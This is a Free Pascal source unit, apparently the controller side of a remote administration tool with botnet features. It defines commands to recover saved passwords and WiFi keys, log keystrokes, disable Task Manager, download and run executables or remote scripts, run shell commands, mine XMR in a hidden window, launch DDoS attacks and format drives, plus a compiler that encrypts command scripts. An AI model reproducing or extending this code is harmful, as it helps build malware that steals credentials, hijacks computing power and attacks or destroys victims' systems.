unit Commands;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils, Communication;

type
  TVoidCommand = record
    Name: String;
    Desc: String;
    AlertLevel: 1..3;
    ParamRequest: String;
    Number: LongInt;
  end;

var AllCommands: Array of TVoidCommand;

procedure InitCommands;
function FindCommandByNum(Num: LongInt): TVoidCommand;
function FindCommandByName(Name: String): TVoidCommand;
function GetAllCommandNames: TStringList;
function CompileScript(ALines: TStrings; OutFileName: String): String;

implementation

function FindCommandByNum(Num: LongInt): TVoidCommand;
var K: LongInt;
Begin
 Result.Name:='Not found';
 For K:=Low(AllCommands) to High(AllCommands) do
 if AllCommands[K].Number = Num then Begin
  Result:=AllCommands[K];
  Break;
 end;
end;

function FindCommandByName(Name: String): TVoidCommand;
var K: LongInt;
Begin
 Result.Name:='Not found';
 For K:=Low(AllCommands) to High(AllCommands) do
 if AllCommands[K].Name = Name then Begin
  Result:=AllCommands[K];
  Break;
 end;
end;

function GetAllCommandNames: TStringList;
var AList: TStringList;
    K: LongInt;
Begin
 AList:=TStringList.Create;
 For K:=Low(AllCommands) to High(AllCommands) do
 AList.Add(AllCommands[K].Name);
 Result:=AList;
end;

procedure AddDetails(Number: LongInt; Name, Desc: String; AlertLevel: Byte; ParamR: String);
var H: LongInt;
Begin
 H:=High(AllCommands);
 SetLength(AllCommands, H + 2);
 Inc(H);
 AllCommands[H].Number:=Number;
 AllCommands[H].Name:=Name;
 AllCommands[H].Desc:=Desc;
 AllCommands[H].AlertLevel:=AlertLevel;
 AllCommands[H].ParamRequest:=ParamR;
end;

procedure InitCommands;
Begin
 AddDetails(10,'Shutdown','Turn the given computer off.',3,'0@');
 AddDetails(20,'Shutdown_with_Message','Display a message for a specified amount of time before turning the computer off.',3,'1@Message|Big#');
 AddDetails(30,'Reboot','Reboot the given computer.',3,'0@');
 AddDetails(40,'Turn_Monitor_OFF','Turn the monitors belonging to the given computer OFF.',3,'0@');
 AddDetails(50,'Turn_Monitor_ON','Turn the monitors belonging to the given computer ON.',3,'0@');
 AddDetails(11,'Get_Network_Information','Get information about the available networks.',1,'0@');
 AddDetails(21,'Get_WiFi_Profiles','Get the available WiFi networks'' name, and some useful information about them. This can be used to determine the client''s current geolocation.',1,'0@');
 AddDetails(31,'Recover_WiFi_Profiles','Recover the saved WiFi profiles (Key, AP Name, Encryption).',1,'1@File Name|Edit#');
 AddDetails(12,'Get_Running_Process','Get the complete list of running processes.',1,'0@');
 AddDetails(22,'Check_if_a_Process_Exists','Check if the given process exists. Can be used to determine the level of protection the given computer has.',1,'1@Process Name|Edit#');
 AddDetails(32,'Kill_Process','Attempt to forcefully kill a process.',2,'1@Process Name|Edit#');
 AddDetails(42,'Disable_Task_Manager','Attempt to disable Task Manager using a Registry trick.',2,'0@');
 AddDetails(52,'Enable_Task_Manager','Attempt to enable Task Manager using a Registry trick.',2,'0@');
 AddDetails(13,'Get_System_Information','Get detailed information of the given computer''s system and available devices.',1,'0@');
 AddDetails(23,'Get_Installed_Programs','Get the list of installed softwares. Note that this action requires administrative privileges.',1,'0@');
 AddDetails(33,'Recover_Saved_Passwords','Attempt to recover saved passwords using an external module.',2,'1@File Name|Edit#');
 AddDetails(14,'Download_File','Download the specified file to the client''s computer, preserving the attributes.',2,'2@File URL|Edit#Remote Name|Edit#');
 AddDetails(24,'Upload_File','Upload the specified file to the cloud, preserving the attributes.',1,'2@File Name|Edit#Upload To|Edit#');
 AddDetails(34,'Run_Executable','Run an executable file.',2,'1@File Name|Edit#');
 AddDetails(44,'Run_Command','Execute the given command using the Command Prompt.',1,'1@Command|Big#');
 AddDetails(54,'Update_Client','Update the client''s remote administration module.',1,'1@File URL|Edit#');
 AddDetails(64,'Restart_Client','Attempt to restart the client''s remote administration module.',1,'0@');
 AddDetails(74,'Uninstall_Client','Uninstall the client''s remote administration module, and attempt to undo any changes done to the Registry.',1,'0@');
 AddDetails(84,'Ignore_Client','Interrupt the communication process, and ignore the client''s module. You WILL NOT be able to control the given computer afterwards, but the module WILL keep running.'+sLineBreak+'Use with caution!',1,'0@');
 AddDetails(94,'Format_Drive','Attempt to format a Drive, destroy every available file.'+sLineBreak+'Use with caution!',3,'1@Drive Letter|Edit');
 AddDetails(15,'Execute_Script','Execute a Script compiled with the Script Editor.',2,'1@File Name|Edit#');
 AddDetails(25, 'Schedule_Script','Schedule the execution of a Script.',1,'2@File Name|Edit#Time|DatePicker#');
 AddDetails(35,'Execute_JavaScript','Download and execute JavaScript.',2,'1@URL|Edit#');
 AddDetails(45,'Execute_VBScript','Download and execute VBScript.',2,'1@URL|Edit#');
 AddDetails(55,'Halt_All_Scripts','Attempt to terminate all running Scripts (Native, JS, VBS).'+sLineBreak+'Use with caution!',2,'0@');
 AddDetails(16,'Start_Mining','Start mining XMR using an external module.'+sLineBreak+'Visit bit.ly/SMinerSettings for settings!',2,
            '9@Pool|Edit#Address|Edit#Password|Edit#Worker ID|Edit#Worker ID Location|Edit#Process Priority|Edit#Hide Window|Edit#'+
            'Process|Edit#Idle Time Before Start|Number#');
 AddDetails(26,'Stop_Mining','Stop the current mining thread.',2,'0@');
 AddDetails(36,'Start_DDoS','Start a DDoS attack against a given IP Address.',2,'2@IP Address|Edit#Port|Number#');
 AddDetails(46,'Stop_DDoS','Stop all active DDoS threads.',2,'0@');
 AddDetails(56,'Start_Keylogger','Start logging keystrokes and save the reports.',1,'2@Directory|Edit#Single Log Size|Number#');
 AddDetails(66,'Stop_KeyLogger','Stop logging keystrokes and delete the previous reports.',1,'0@');
 AddDetails(76,'Open_Webpage','Open the specified webpage.',3,'1@URL|Edit#');
 AddDetails(86,'Change_Volume','Change the system volume.',2,'1@New Volume|Number#');
 AddDetails(96,'Play_Sound','Start playing a sound from the specified file.',3,'1@File Name (WAV)|Edit#');
 AddDetails(106,'Beep','Beep-Bloop.',3,'0@');
 AddDetails(116,'Print','Attempt to print a document with the default printer.',3,'1@File Name|Edit#');
 AddDetails(126,'Open_File','Open the specified file using the default action.',3,'1@File Name|Edit#');
 AddDetails(136,'Messagebox','Display a message.',3,'2@Caption|Edit#Message|Big#');
 AddDetails(999,'CustomCommand','Performs a custom command',3,'2@Command number|Number#Parameters|Big#');
end;

procedure RemoveComments(var Str: String);
var J: LongInt;
Begin
 For J:=1 to Length(Str)-1 do
 if (Str[J]='/') and (Str[J+1]='/') then Begin
  Str:=LeftStr(Str, J-1);
  Break;
 end;
end;

function EmptyLine(Str: String): Boolean;
var J: LongInt;
Begin
 Result:=True;
 For J:=1 to Length(Str) do Begin
  if (Str[J]<>' ') and (Str[J]<>#9) and (Str[J]<>#10) and (Str[J]<>#13) then Begin
   Result:=False;
   Break;
  end;
 end;
end;

function SParamType(Param: String): String;
Begin
 Case Param of
 'Big', 'Edit': Result:='String';
 'DatePicker': Result:='Date and Time';
 'Radio': Result:='Boolean';
 'Number': Result:='Number';
 else Result:='Unknown';
 end;
end;

function ParamType(Param: String): String;
var DummyDate: TDateTime;
    DummyInt: Integer;
Begin
 if (Param[1]='''') and (Param[Length(Param)]='''') then Result:='String' else
 if (SameText(Param, 'True')) or (SameText(Param, 'False')) then Result:='Boolean' else
 if TryStrToInt(Param, DummyInt) then Result:='Number' else
 if TryStrToDateTime(Param, DummyDate) then Result:='Date and Time' else
 Result:='Unknown';
end;

function ExtractParam(ParamNum: LongInt; CStr: String): String;
var X: String;
    J: LongInt;
Begin
 X:=CStr;
 Delete(X, 1, Pos('(', X));
 if X[Length(X)]=';' then Delete(X, Length(X), 1);
 if X[Length(X)]=')' then Begin
  Delete(X, Length(X), 1);
  X+=',';
 end;
 For J:=1 to ParamNum-1 do Begin
  Delete(X, 1, Pos(',', X));
  if Length(X)>0 then While X[1]=' ' do Delete(X, 1, 1);
 end;
 X:=LeftStr(X, Pos(',', X) - 1);
 if Length(X)>0 then While X[Length(X)]=' ' do Delete(X, Length(X), 1);
 Result:=X;
end;

function CompileScript(ALines: TStrings; OutFileName: String): String;
var J, K, PC: LongInt;
    TheLine, CommandStr, ParamStr, CParam, CType: String;
    CmdToAdd: String;
    TheCommand: TVoidCommand;
    NewScript: TStringList;
    FFile: Text;
Begin
 Result:='Compile successful.';
 NewScript:=TStringList.Create;
 For J:=0 to ALines.Count-1 do Begin
  TheLine:=ALines.Strings[J];
  RemoveComments(TheLine);
  if Not(EmptyLine(TheLine)) then Begin
   CommandStr:=LeftStr(TheLine, Pos('(',TheLine) - 1);
   Delete(TheLine, 1, Pos('(', TheLine));
   TheCommand:=FindCommandByName(CommandStr);
   if TheCommand.Name='Not found' then Begin
    Result:='Line '+IntToStr(J+1)+': unknown command "'+CommandStr+'"';
    Break;
   end
   else Begin
    CmdToAdd:=IntToStr(TheCommand.Number)+'@';
    ParamStr:=TheCommand.ParamRequest;
    PC:=StrToInt(LeftStr(ParamStr,Pos('@',ParamStr)-1));
    For K:=1 to PC do Begin
     CParam:=ExtractParam(K, TheLine);
     Delete(ParamStr,1,Pos('|',ParamStr));
     CType:=LeftStr(ParamStr, Pos('#', ParamStr) - 1);
     CType:=SParamType(CType);
     if CType<>ParamType(CParam) then Begin
      Result:='Line '+IntToStr(J+1)+': Type mismatch.'+sLineBreak+'Parameter '+IntToStr(K)+' ('+ParamType(CParam)+') must be of type '+CType;
      Break;
     end else Begin
      if ParamType(CParam)='String' then Begin
      Delete(CParam, 1, 1);
      Delete(CParam, Length(CParam), 1);
      end;
      CmdToAdd+=CParam+'#';
     end;
    end;
    NewScript.Add(CmdToAdd);
   end;
  end;
 end;
 if Result='Compile successful.' then Begin
  AssignFile(FFile, OutFileName);
  Rewrite(FFile);
  Write(FFile,EncryptStr(NewScript.Text, TheKey));
  Result+=slineBreak+'The compiled script was saved.';
  CloseFile(FFile);
 end;
 NewScript.Free;
end;

end.

